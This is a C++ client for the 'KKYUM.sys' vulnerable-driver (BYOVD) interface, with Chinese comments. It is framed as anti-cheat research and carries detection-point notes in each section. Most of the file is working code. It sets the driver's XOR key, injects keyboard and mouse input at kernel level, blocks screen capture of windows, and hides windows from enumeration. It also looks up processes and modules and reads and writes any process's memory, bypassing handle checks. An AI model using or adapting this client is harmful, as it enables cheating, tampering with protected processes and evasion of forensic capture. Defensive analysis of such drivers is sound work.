// demo.cpp — KKYUM.sys (BYOVD 漏洞驱动) IOCTL 利用面还原 Demo
// 用途: 游戏安全研究 —— 验证漏洞驱动攻击面 / 编写反外挂检测与拦截规则
// 编译: cl /EHsc /W4 /O2 demo.cpp  (x64)
//
// ================================ 协议总览 ================================
// 设备路径 : \\.\KKYUM   (内核 \Device\KKYUM, 符号链接 \DosDevices\KKYUM)
//            IoCreateDevice 时 Flags: DO_DIRECT_IO 被清掉、DO_BUFFERED_IO(+0x10) 置位
// 加密协议 : 先用 0x222640 预设密钥(1~256字节); 之后每包输入按 b[i] ^= key[i % keyLen]
//            * 密钥未设置(长度=0)时驱动跳过解密 => 全部明文通信
//            * 0x222654 / 0x222650 的输出会被驱动【再加密一遍】, R3 收到后需再解密
//            * 0x222662 / 0x222666 的 MDL 数据: 写=发密文, 读=收密文
//            * 例外: 0x222658 / 0x22265C 输入【明文】, 驱动不解密
//
// ================================ IOCTL 总表 ==============================
//   0x222640  设置 XOR 密钥            输入=密钥字节(明文)
//   0x222644  安装键鼠注入基础设施      无输入  -> 定位 kbdclass/mouclass ClassService
//   0x22264C  模拟键盘按键             12B  KEYBOARD_INPUT_DATA            [加密]
//   0x222648  模拟鼠标事件             24B  MOUSE_INPUT_DATA               [加密]
//   0x222624  DWM 防截屏开关           16B  {HWND, Flags}                  [加密]
//   0x222620  隐藏窗口(链摘除)         16B  {HWND}                         [加密]
//   0x22261C  窗口挂回(插到B后)        16B  {HWND_A, HWND_B}               [加密]
//   0x222654  按进程名查 PID          520B  {WCHAR name[256]; u64 pid}     [加密, 出参也加密]
//   0x222650  按模块名查基址          528B  {u64 pid; WCHAR name[256]; u64 base} [加密, 出参也加密]
//   0x222658  批量写目标进程内存       {u32 pid; u32 count; {dst,src,size}xN}  [明文]
//   0x22265C  批量读目标进程内存       {u32 pid; u32 count; {src,dst,size}xN}  [明文]
//   0x222662  MDL 大块写              32B 头 {u32 pid; u64 dst; u32 size} + MDL 密文
//   0x222666  MDL 大块读              32B 头 {u32 pid; u64 src; u32 size} + MDL 密文
//
// 内核侧关键函数(与 IDB 命名一致):
//   DispatchIoctl_1400015C0          IOCTL 分发 + 逐包 XOR 解密
//   Init_ProtectWindow_140001000     attach winlogon -> RtlFindExportedRoutineByName 拿
//                                    win32kbase!ValidateHwnd -> FindCode_140001F98 扫签名
//                                    E8 ?? ?? ?? ?? 8B ?? 85 C0 75 0E 解出
//                                    win32kfull!GreProtectSpriteContent (非导出)
//   GreProtectSpriteContent_140001F68  wrapper: f(0, HWND, 1, Flags) 开防截屏
//   ProtectWindow_140001F04          PWND spwndPrev/spwndNext 双向链摘除 = 隐藏窗口
//   ProtectWindow_140001E1C          已摘除窗口挂回链表
//   KeyboardClassServiceCallback_140002138 / MouseClassServiceCallback_1400021BC
//                                    打包输入转发给 kbdclass/mouclass ClassService
//   GetProcessId_1400014D0           ZwQuerySystemInformation(SystemProcessInformation) 枚举
//   GetProcessModuleBase_140001360   KeStackAttachProcess + PEB->Ldr(含 Wow64 PEB32) 遍历
//   ReadMemory_140001CD8 / 写        MmCopyVirtualMemory / MDL 路径

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstdint>
#include <string>
#include <vector>

// ============================== IOCTL 码 ==============================
static const DWORD IOCTL_SET_KEY       = 0x222640; // METHOD_BUFFERED
static const DWORD IOCTL_INIT_HOOK     = 0x222644; // METHOD_BUFFERED
static const DWORD IOCTL_MOUSE_SEND    = 0x222648; // METHOD_BUFFERED
static const DWORD IOCTL_KBD_SEND      = 0x22264C; // METHOD_BUFFERED
static const DWORD IOCTL_PROTECT_WND   = 0x222624; // METHOD_BUFFERED
static const DWORD IOCTL_HIDE_WND      = 0x222620; // METHOD_BUFFERED
static const DWORD IOCTL_ATTACH_WND    = 0x22261C; // METHOD_BUFFERED
static const DWORD IOCTL_FIND_PID      = 0x222654; // METHOD_BUFFERED
static const DWORD IOCTL_FIND_MODULE   = 0x222650; // METHOD_BUFFERED
static const DWORD IOCTL_BATCH_WRITE   = 0x222658; // METHOD_BUFFERED
static const DWORD IOCTL_BATCH_READ    = 0x22265C; // METHOD_BUFFERED
static const DWORD IOCTL_MDL_WRITE     = 0x222662; // METHOD_OUT_DIRECT
static const DWORD IOCTL_MDL_READ      = 0x222666; // METHOD_OUT_DIRECT

static const wchar_t* KKYUM_DEVICE = L"\\\\.\\KKYUM";

// ============================== 基础设施 ==============================

// 打开设备。BYOVD 场景下驱动是手动加载的, 无需服务权限校验, 任何 R3 进程都能开。
static HANDLE KkyumOpen()
{
    HANDLE h = CreateFileW(KKYUM_DEVICE,
                           GENERIC_READ | GENERIC_WRITE,
                           0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        wprintf(L"[!] Open %s failed, GLE=%lu\n", KKYUM_DEVICE, GetLastError());
    return h;
}

// 异步句柄统一转同步, 方便下面 DeviceIoControl 直接用
static HANDLE KkyumOpenSync()
{
    HANDLE h = KkyumOpen();
    return h;
}

// 与驱动一致的 XOR (加解密同函数, 对称)
// 对应内核 DispatchIoctl_1400015C0 里每个 handler 开头的解密循环
static void KkyumXor(uint8_t* buf, size_t len, const uint8_t* key, size_t keyLen)
{
    if (!keyLen) return;
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= key[i % keyLen];
}

// ---------------------------------------------------------------------------
// IOCTL 0x222640 — 设置全局 XOR 密钥
// 内核: DispatchIoctl @0x14000167C
//       len = Parameters.DeviceIoControl.InputBufferLength, 合法 1~256
//       memcpy(byte_140005100, SystemBuffer, len); Key_140005200 = len
// 注意: 这包本身是【明文】发送(此刻密钥还没建立)。
// 副作用: 不发这包 => Key=0 => 后续所有 IOCTL 全部明文通信, 效果一样。
// 检测点: 对任意 \Device\KKYUM 的打开 + 0x222640 控制 Code, 可直接拦截/告警。
// ---------------------------------------------------------------------------
static bool KkyumSetXorKey(HANDLE h, const uint8_t* key, DWORD len)
{
    if (!key || len == 0 || len > 256) { wprintf(L"[!] key len must be 1~256\n"); return false; }
    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_SET_KEY, (LPVOID)key, len, nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222640 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] XOR key set, len=%lu\n", len);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x222644 — 安装键鼠注入基础设施
// 内核: DispatchIoctl @0x140001675 -> InitPhysicalDeviceInformations_1400020A4
//       ObReferenceObjectByName(\Driver\WMIxWDM) 取 WMIxWDM 驱动对象,
//       遍历其设备栈按名字定位 \Driver\kbdclass / \Driver\mouclass,
//       摸到各自 DeviceObject + ClassService 回调, 存入全局:
//         KeyboardDevice_1400054C0 / KeyboardClassServiceCallback_1400054C8
//         MouseDevice_1400054D0    / MouseClassServiceCallback_1400054D8
// 之后的 0x22264C / 0x222648 都依赖这次初始化。
// 检测点: ObReferenceObjectByName 对 kbdclass/mouclass 的非常规引用(ETW/内核回调);
//         kbdclass!ClassService 调用栈里出现非键盘驱动的返回地址。
// ---------------------------------------------------------------------------
static bool KkyumInstallHookInfra(HANDLE h)
{
    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_INIT_HOOK, nullptr, 0, nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222644 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] kbd/mou hook infrastructure installed\n");
    return true;
}

// ============================== 键鼠注入 ==============================

// kbdclass 原生输入记录 (内核 ntddk 中的 KEYBOARD_INPUT_DATA), sizeof = 0x0C
typedef struct _KK_KBD_INPUT {
    uint16_t UnitId;      // +0x00 设备单元号, 填 0
    uint16_t MakeCode;    // +0x02 扫描码 (0x2A=LShift, 0x1D=LCtrl, 0x39=Space ...)
    uint16_t Flags;       // +0x04 KEY_MAKE=0 按下 / KEY_BREAK=1 弹起 / +KEY_E0(2) 扩展键
    uint16_t Reserved;    // +0x06
    uint32_t ExtraInfo;   // +0x08
} KK_KBD_INPUT;
static_assert(sizeof(KK_KBD_INPUT) == 12, "must be 12 bytes");

// mouclass 原生输入记录 (MOUSE_INPUT_DATA), sizeof = 0x18
typedef struct _KK_MOUSE_INPUT {
    uint16_t UnitId;      // +0x00
    uint16_t Flags;       // +0x02 MOUSE_MOVE_RELATIVE=0 / MOUSE_MOVE_ABSOLUTE=1
    uint16_t ButtonFlags; // +0x04 BUTTON1_DOWN=1, BUTTON1_UP=2, BUTTON2_DOWN=4, BUTTON2_UP=8,
                          //        BUTTON3_DOWN=0x10, BUTTON3_UP=0x20, MOUSE_WHEEL=0x400
    uint16_t ButtonData;  // +0x06 滚轮增量
    uint32_t RawButtons;  // +0x08
    int32_t  LastX;       // +0x0C
    int32_t  LastY;       // +0x10
    uint32_t ExtraInfo;   // +0x14
} KK_MOUSE_INPUT;
static_assert(sizeof(KK_MOUSE_INPUT) == 24, "must be 24 bytes");

// ---------------------------------------------------------------------------
// IOCTL 0x22264C — 模拟键盘按键
// 内核: DispatchIoctl @0x1400017B9  (解密 12B)
//       -> KeyboardClassServiceCallback_140002138:
//          ExAllocatePool(0x7C) -> memcpy 12B -> kbdclass!ClassService(DeviceObject,
//          pool, pool+0xC, &consumed) -> ExFreePoolWithTag
// 等价于把一条"真实键盘记录"直接喂进 kbdclass, 绕过 R3 SendInput/消息钩子。
// 用法: 按+放 = 发两次 (Make+Break)。扩展键(方向键等) MakeCode | (KEY_E0<<8)? —— 不是,
//       扩展键是 Flags |= KEY_E0 (0x02)。
// 检测点: ClassService 的 InputDataStart 指向非 kbdclass 分页池; 调用方栈回溯异常。
// ---------------------------------------------------------------------------
static bool KkyumSendKeyboard(HANDLE h, uint16_t makeCode, uint16_t flags,
                              const uint8_t* key, size_t keyLen)
{
    KK_KBD_INPUT in = {};
    in.MakeCode = makeCode;
    in.Flags    = flags;

    uint8_t buf[sizeof(in)];
    memcpy(buf, &in, sizeof(in));
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 驱动会先解密 12B

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_KBD_SEND, buf, sizeof(buf), nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x22264C failed, GLE=%lu\n", GetLastError());
        return false;
    }
    return true;
}

// 按一下再松开 (拆成两次 IOCTL: KEY_MAKE + KEY_BREAK)
static bool KkyumPressKey(HANDLE h, uint16_t makeCode, bool extended,
                          const uint8_t* key, size_t keyLen)
{
    const uint16_t e0 = extended ? 0x02 : 0x00;
    if (!KkyumSendKeyboard(h, makeCode, e0 | 0x00, key, keyLen)) return false;  // 按下
    if (!KkyumSendKeyboard(h, makeCode, e0 | 0x01, key, keyLen)) return false;  // 弹起
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x222648 — 模拟鼠标事件
// 内核: DispatchIoctl @0x140001635  (解密 24B)
//       -> MouseClassServiceCallback_1400021BC:
//          ExAllocatePool(0x94) -> memcpy 24B -> mouclass!ClassService(...)
// 检测点: 同键盘, mouclass 侧 InputData 来源异常。
// ---------------------------------------------------------------------------
static bool KkyumSendMouse(HANDLE h, const KK_MOUSE_INPUT& ev,
                           const uint8_t* key, size_t keyLen)
{
    uint8_t buf[sizeof(ev)];
    memcpy(buf, &ev, sizeof(ev));
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 驱动解密 24B

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_MOUSE_SEND, buf, sizeof(buf), nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222648 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    return true;
}

// ============================== DWM / 窗口隐匿 ==============================

// ---------------------------------------------------------------------------
// IOCTL 0x222624 — 指定窗口开关 DWM 防截屏保护
// 内核: DispatchIoctl @0x1400016C4  (解密 16B)
//       先 Init_ProtectWindow_140001000 (attach winlogon, 定位 ValidateHwnd
//       + 签名扫描 GreProtectSpriteContent, 懒初始化一次, 存 140005218 标志位)
//       -> GreProtectSpriteContent_140001F68(HWND, Flags):
//            GreProtectSpriteContent(0, HWND, 1, Flags)   // r8d=1 硬编码
//       R3 的 Flags 走第 4 参数, win32k 内部 and 1 取 bit0 => 1=开启, 0=解除
// 效果: DWM 给窗口精灵上锁, 截图/录屏/OBS/远程桌面抓不到该窗口内容。
// 这是"外挂防审计"功能: 让取证截图拍到黑块。
// 检测点: 内核里 GreProtectSpriteContent 被第三方模块间接调用(签名扫描行为本身
//         也可被 Mm/驱动回调监控); 游戏进程窗口出现 DWM 锁定属性。
// ---------------------------------------------------------------------------
typedef struct _KK_PROTECT_WND {
    uint64_t Hwnd;      // +0x00 目标窗口句柄
    uint32_t Flags;     // +0x08 bit0: 1=开启防截屏 / 0=解除
    uint32_t _pad;      // +0x0C (解密长度固定 16B)
} KK_PROTECT_WND;
static_assert(sizeof(KK_PROTECT_WND) == 16, "must be 16 bytes");

static bool KkyumProtectWindowDwm(HANDLE h, HWND hwnd, bool enable,
                                  const uint8_t* key, size_t keyLen)
{
    KK_PROTECT_WND in{};
    in.Hwnd  = (uint64_t)(uintptr_t)hwnd;
    in.Flags = enable ? 1 : 0;

    uint8_t buf[sizeof(in)];
    memcpy(buf, &in, sizeof(in));
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 驱动解密 16B

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_PROTECT_WND, buf, sizeof(buf), nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222624 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] DWM sprite protect %s for HWND=0x%p\n", enable ? L"ON" : L"OFF", hwnd);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x222620 — 隐藏窗口 (从窗口兄弟链摘除)
// 内核: DispatchIoctl @0x14000171D  (解密 16B, 只用 +0x00)
//       -> ProtectWindow_140001F04(HWND):
//            PWND = ValidateHwnd(HWND)
//            校验 prev->spwndNext==self && next->spwndPrev==self
//            prev->spwndNext = next;  next->spwndPrev = prev;   // 标准 unlink
//            (自身 +0x58/+0x60 不清零, 保留旧邻居以便挂回)
// 效果: EnumWindows / GetWindow / Z 序遍历全部看不到该窗口, 但对象仍存活。
// 与 ShowWindow(SW_HIDE) 区别: 不产生任何窗口消息, R3 钩子完全无感知。
// 前置: 需要 0x222624/0x22261C 或本函数先跑过一次 winlogon 门禁初始化。
// 检测点: 窗口对象存活但不在父窗口兄弟链上(可从内核遍历 PWND 校验)。
// ---------------------------------------------------------------------------
static bool KkyumHideWindow(HANDLE h, HWND hwnd, const uint8_t* key, size_t keyLen)
{
    uint8_t buf[16] = {};
    uint64_t hwnd64 = (uint64_t)(uintptr_t)hwnd;
    memcpy(buf, &hwnd64, sizeof(hwnd64));
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 驱动解密 16B

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_HIDE_WND, buf, sizeof(buf), nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222620 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] window HWND=0x%p unlinked (hidden)\n", hwnd);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x22261C — 窗口挂回 (把已隐藏的窗口 A 插到窗口 B 后面)
// 内核: DispatchIoctl @0x140001772  (解密 16B)
//       -> ProtectWindow_140001E1C(HWND_A, HWND_B):
//            双方都 ValidateHwnd;
//            强校验 A 当前【必须】已脱离原链(prev->spwndNext!=A), 否则拒绝
//            (防止重复插入把链表打环);
//            A->spwndNext = B->spwndNext; B->spwndNext = A; A->spwndPrev = B;
// 已知瑕疵(内核代码就没做对称): 未回写 B 原后继的 spwndPrev 指向 A,
//            反向遍历会跳过 A; B 若是链尾(无后继)直接失败。
// 组合用法: 0x222620 藏 -> 0x22261C 挂回原邻居 = 恢复原位。
// ---------------------------------------------------------------------------
static bool KkyumRestoreWindow(HANDLE h, HWND hwndA, HWND hwndB,
                               const uint8_t* key, size_t keyLen)
{
    uint8_t buf[16];
    uint64_t a = (uint64_t)(uintptr_t)hwndA;
    uint64_t b = (uint64_t)(uintptr_t)hwndB;
    memcpy(buf + 0, &a, 8);
    memcpy(buf + 8, &b, 8);
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 驱动解密 16B

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_ATTACH_WND, buf, sizeof(buf), nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x22261C failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] HWND_A=0x%p attached after HWND_B=0x%p\n", hwndA, hwndB);
    return true;
}

// ============================== 信息收集 ==============================

// 0x222654 请求/应答: 520B = { WCHAR 进程名[256] @0x000 ; u64 PID 出参 @0x200 }
typedef struct _KK_FIND_PID {
    wchar_t  Name[256];   // +0x000 大小写不敏感匹配
    uint64_t ProcessId;   // +0x200 出参
} KK_FIND_PID;
static_assert(sizeof(KK_FIND_PID) == 520, "must be 520 bytes");

// ---------------------------------------------------------------------------
// IOCTL 0x222654 — 按进程名查 PID
// 内核: DispatchIoctl @0x140001BA7  (先解密 520B)
//       RtlInitUnicodeString(&SystemBuffer[0])
//       -> GetProcessId_1400014D0(name, &SystemBuffer[0x200]):
//            ZwQuerySystemInformation(SystemProcessInformation) 全量枚举,
//            逐项 RtlEqualUnicodeString(CaseInSensitive) 匹配 ImageName
//       处理完【整包 520B 重新加密】回传, IoStatus.Information=0x208
// => R3 收到的是密文, 需再 KkyumXor 一遍才能读出 PID!
// 检测点: ZwQuerySystemInformation 大量短命调用 + 敏感进程名探测, 属外挂前期侦察。
// ---------------------------------------------------------------------------
static bool KkyumFindPidByName(HANDLE h, const wchar_t* processName, uint32_t* pidOut,
                               const uint8_t* key, size_t keyLen)
{
    KK_FIND_PID req{};
    wcsncpy_s(req.Name, processName, _TRUNCATE);

    uint8_t buf[sizeof(req)];
    memcpy(buf, &req, sizeof(req));
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 发送前加密

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_FIND_PID, buf, sizeof(buf), buf, sizeof(buf), &ret, nullptr))
    {
        wprintf(L"[!] 0x222654 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 应答被驱动再加密, 解回来

    KK_FIND_PID rsp{};
    memcpy(&rsp, buf, sizeof(rsp));
    *pidOut = (uint32_t)rsp.ProcessId;
    return true;
}

// 0x222650 请求/应答: 528B = { u64 PID @0x000 ; WCHAR 模块名[256] @0x008 ; u64 DllBase 出参 @0x208 }
typedef struct _KK_FIND_MODULE {
    uint64_t ProcessId;   // +0x000
    wchar_t  Name[256];   // +0x008 模块名, 大小写不敏感
    uint64_t ModuleBase;  // +0x208 出参
} KK_FIND_MODULE;
static_assert(sizeof(KK_FIND_MODULE) == 528, "must be 528 bytes");

// ---------------------------------------------------------------------------
// IOCTL 0x222650 — 按模块名查目标进程内模块基址
// 内核: DispatchIoctl @0x140001C30  (先解密 528B)
//       -> GetProcessModuleBase_140001360(pid, name, &SystemBuffer[0x208]):
//            PsLookupProcessByProcessId -> KeStackAttachProcess
//            遍历 PEB->Ldr.InLoadOrderModuleList, 命中返回 DllBase;
//            32 位进程走 Wow64: PEB32->Ldr (Ldr 数据通过安全拷贝读出)
//       整包 528B 重新加密回传 => R3 需再解密。
// 用途: 找到 ntdll/kernelbase 等模块基址后配合 0x222658/0x222662 改代码段。
// ---------------------------------------------------------------------------
static bool KkyumFindModuleBase(HANDLE h, uint32_t pid, const wchar_t* moduleName,
                                uint64_t* baseOut, const uint8_t* key, size_t keyLen)
{
    KK_FIND_MODULE req{};
    req.ProcessId = pid;
    wcsncpy_s(req.Name, moduleName, _TRUNCATE);

    uint8_t buf[sizeof(req)];
    memcpy(buf, &req, sizeof(req));
    KkyumXor(buf, sizeof(buf), key, keyLen);

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_FIND_MODULE, buf, sizeof(buf), buf, sizeof(buf), &ret, nullptr))
    {
        wprintf(L"[!] 0x222650 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    KkyumXor(buf, sizeof(buf), key, keyLen);          // 应答解密

    KK_FIND_MODULE rsp{};
    memcpy(&rsp, buf, sizeof(rsp));
    *baseOut = rsp.ModuleBase;
    return true;
}

// ============================== 内存读写 ==============================

// ---------------------------------------------------------------------------
// IOCTL 0x222658 — 批量写目标进程内存  【注意: 输入明文, 驱动不解密!】
// 内核: DispatchIoctl @0x140001ACA
//   头: u32 PID @+0x00 ; u32 count @+0x04          (InputBufferLength>=8 且 >= 8+24*count)
//   条目(24B/条, 紧跟头部):
//     u64 TargetAddress  @+0x00  目标进程内的目的地址
//     u64 SourceAddress  @+0x08  【本进程】的源数据地址(R3 有效地址)
//     u64 Size           @+0x10
//   循环 count 次 MmCopyVirtualMemory(当前进程->目标进程, PreviousMode=KernelMode)
// 效果: 绕过句柄/权限校验的直接任意写, 可改游戏代码段/数据段/反作弊对象。
// 检测点: ObRegisterCallbacks 拿不到(用的 EPROCESS 直接引用), 需内核侧行为监控:
//         MmCopyVirtualMemory 调用方为非 win32k/非 csrss 的可信白名单外驱动。
// ---------------------------------------------------------------------------
typedef struct _KK_RW_ENTRY {
    uint64_t RemoteAddress;  // 目标进程内地址
    uint64_t LocalAddress;   // 本进程内地址
    uint64_t Size;           // 字节数
} KK_RW_ENTRY;
static_assert(sizeof(KK_RW_ENTRY) == 24, "must be 24 bytes");

static bool KkyumBatchWrite(HANDLE h, uint32_t pid,
                            const std::vector<KK_RW_ENTRY>& entries)
{
    if (entries.empty()) return false;
    std::vector<uint8_t> buf(sizeof(uint32_t) * 2 + entries.size() * sizeof(KK_RW_ENTRY));
    uint32_t count = (uint32_t)entries.size();
    memcpy(buf.data() + 0, &pid, 4);
    memcpy(buf.data() + 4, &count, 4);
    memcpy(buf.data() + 8, entries.data(), entries.size() * sizeof(KK_RW_ENTRY));

    DWORD ret = 0;
    // 明文! 不能 XOR
    if (!DeviceIoControl(h, IOCTL_BATCH_WRITE, buf.data(), (DWORD)buf.size(),
                         nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x222658 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] batch write %u ops to pid=%u\n", count, pid);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x22265C — 批量读目标进程内存  【输入明文】
// 内核: DispatchIoctl @0x1400019E4
//   头: u32 PID @+0x00 ; u32 count @+0x04
//   条目(24B/条):
//     u64 SourceAddress  @+0x00  目标进程内的源地址
//     u64 TargetAddress  @+0x08  【本进程】的目的地址(R3 有效地址)
//     u64 Size           @+0x10
//   循环 MmCopyVirtualMemory(目标进程->当前进程, KernelMode)
// 注意: 条目字段方向与 0x222658 相反, 数据直接落到 R3 的 LocalAddress。
// ---------------------------------------------------------------------------
static bool KkyumBatchRead(HANDLE h, uint32_t pid,
                           const std::vector<KK_RW_ENTRY>& entries)
{
    if (entries.empty()) return false;
    std::vector<uint8_t> buf(8 + entries.size() * sizeof(KK_RW_ENTRY));
    uint32_t count = (uint32_t)entries.size();
    memcpy(buf.data() + 0, &pid, 4);
    memcpy(buf.data() + 4, &count, 4);
    memcpy(buf.data() + 8, entries.data(), entries.size() * sizeof(KK_RW_ENTRY));

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_BATCH_READ, buf.data(), (DWORD)buf.size(),
                         nullptr, 0, &ret, nullptr))
    {
        wprintf(L"[!] 0x22265C failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] batch read %u ops from pid=%u\n", count, pid);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x222662 — MDL 大块写 (适合写大段代码/镜像)
// METHOD_OUT_DIRECT: 头 32B 走 SystemBuffer, 数据走 Irp->MdlAddress
// 内核: DispatchIoctl @0x140001918
//   头(32B, XOR 加密): u32 PID @+0x00 ; u64 目标地址 @+0x08 ; u32 Size @+0x18
//   流程: 解密头部->存全局(xmmword_140005480/490) -> MmMapLockedPagesSpecifyCache
//         映射 MDL -> sub_140001DE4 对 MDL 数据【XOR 解密】(R3 发的就是密文)
//         -> ReadMemory_140001D78(pid, dst, buf, size) 写入目标进程 -> KeFlushIoBuffers
// ---------------------------------------------------------------------------
typedef struct _KK_MDL_HDR {
    uint32_t ProcessId;     // +0x00
    uint32_t _pad0;         // +0x04
    uint64_t RemoteAddress; // +0x08
    uint32_t _pad1;         // +0x10
    uint32_t _pad2;         // +0x14
    uint32_t Size;          // +0x18
    uint32_t _pad3;         // +0x1C (共 32B)
} KK_MDL_HDR;
static_assert(sizeof(KK_MDL_HDR) == 32, "must be 32 bytes");

static bool KkyumMdlWrite(HANDLE h, uint32_t pid, uint64_t remoteAddr,
                          const std::vector<uint8_t>& data,
                          const uint8_t* key, size_t keyLen)
{
    KK_MDL_HDR hdr{};
    hdr.ProcessId     = pid;
    hdr.RemoteAddress = remoteAddr;
    hdr.Size          = (uint32_t)data.size();

    uint8_t hdrBuf[sizeof(hdr)];
    memcpy(hdrBuf, &hdr, sizeof(hdr));
    KkyumXor(hdrBuf, sizeof(hdrBuf), key, keyLen);    // 头加密

    // MDL 数据必须先加密(驱动收到后会解密)
    std::vector<uint8_t> payload(data);
    KkyumXor(payload.data(), payload.size(), key, keyLen);

    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_MDL_WRITE, hdrBuf, sizeof(hdrBuf),
                         payload.data(), (DWORD)payload.size(), &ret, nullptr))
    {
        wprintf(L"[!] 0x222662 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    wprintf(L"[+] MDL write %zu bytes -> pid=%u addr=0x%llX\n", data.size(), pid, remoteAddr);
    return true;
}

// ---------------------------------------------------------------------------
// IOCTL 0x222666 — MDL 大块读
// 内核: DispatchIoctl @0x14000184A
//   头 32B 同上(RemoteAddress 语义变为【源地址】)
//   流程: 映射 MDL -> ReadMemory_140001CD8(pid, src, buf, size) 读入
//         -> sub_140001DE4 对数据【XOR 加密】-> R3 收到密文需解密 -> KeFlushIoBuffers
// ---------------------------------------------------------------------------
static bool KkyumMdlRead(HANDLE h, uint32_t pid, uint64_t remoteAddr, uint32_t size,
                         std::vector<uint8_t>& dataOut,
                         const uint8_t* key, size_t keyLen)
{
    KK_MDL_HDR hdr{};
    hdr.ProcessId     = pid;
    hdr.RemoteAddress = remoteAddr;
    hdr.Size          = size;

    uint8_t hdrBuf[sizeof(hdr)];
    memcpy(hdrBuf, &hdr, sizeof(hdr));
    KkyumXor(hdrBuf, sizeof(hdrBuf), key, keyLen);

    std::vector<uint8_t> buf(size, 0);
    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_MDL_READ, hdrBuf, sizeof(hdrBuf),
                         buf.data(), (DWORD)buf.size(), &ret, nullptr))
    {
        wprintf(L"[!] 0x222666 failed, GLE=%lu\n", GetLastError());
        return false;
    }
    KkyumXor(buf.data(), buf.size(), key, keyLen);    // 应答解密
    dataOut = std::move(buf);
    return true;
}

// ============================== Demo 流程 ==============================
// 默认只演示【只读】侦察链路(找 PID -> 找模块 -> 读内存), 写入/注入/隐匿类
// 函数已封装好, 按需自行调用 —— 请仅在自有测试环境使用。
int main()
{
    HANDLE h = KkyumOpenSync();
    if (h == INVALID_HANDLE_VALUE) return 1;

    // 1) 可选: 预设 XOR 密钥。不设也行(Key=0 时驱动全程明文)。
    const uint8_t key[8] = { 'K','K','Y','U','M','P','O','C' };
    KkyumSetXorKey(h, key, sizeof(key));
    const uint8_t* k = key;  const size_t klen = sizeof(key);

    // 2) 侦察: 按进程名查 PID (改成你测试机上的目标, 如 notepad.exe)
    uint32_t pid = 0;
    if (KkyumFindPidByName(h, L"notepad.exe", &pid, k, klen) && pid)
        wprintf(L"[+] pid = %u\r\n", pid);
    else { wprintf(L"[-] target not found\r\n"); CloseHandle(h); return 0; }

    // 3) 侦察: 查目标内 user32.dll 基址 (验证跨进程 PEB 遍历)
    uint64_t base = 0;
    if (KkyumFindModuleBase(h, pid, L"user32.dll", &base, k, klen) && base)
        wprintf(L"[+] user32.dll @ 0x%llX\r\n", base);

    // 4) 侦察: 读目标 PEB 前 0x10 字节验证任意读 (明文批量读)
    uint8_t local[0x10] = {};
    KK_RW_ENTRY rd{};
    rd.LocalAddress  = (uint64_t)(uintptr_t)local;
    rd.Size          = sizeof(local);
    // 先拿到 PEB 地址: 0x22265C 里读 NtQueryInformationProcess 拿不到,
    // 这里以模块基址前 0x10 字节('MZ')做演示
    if (base) {
        rd.RemoteAddress = base;
        if (KkyumBatchRead(h, pid, { rd }))
            wprintf(L"[+] MZ header: %02X %02X\r\n", local[0], local[1]);
    }

    // --- 以下能力封装完毕, 自行按测试需要启用 ---
    // KkyumInstallHookInfra(h);                                     // 0x222644 键鼠基础设施
    // KkyumPressKey(h, 0x39, false, k, klen);                       // 0x22264C 敲一个空格
    // KK_MOUSE_INPUT mv{}; mv.LastX = 100;                          // 0x222648 鼠标相对移动
    // KkyumSendMouse(h, mv, k, klen);
    // KkyumProtectWindowDwm(h, hwnd, true, k, klen);                // 0x222624 防截屏
    // KkyumHideWindow(h, hwnd, k, klen);                            // 0x222620 藏窗口
    // KkyumRestoreWindow(h, hwnd, hwndOldNeighbor, k, klen);        // 0x22261C 挂回
    // KkyumBatchWrite(h, pid, { wr });                              // 0x222658 任意写
    // KkyumMdlRead(h, pid, base, 0x1000, out, k, klen);             // 0x222666 大块读
    // KkyumMdlWrite(h, pid, base, data, k, klen);                   // 0x222662 大块写

    CloseHandle(h);
    system("pause");
    return 0;
}
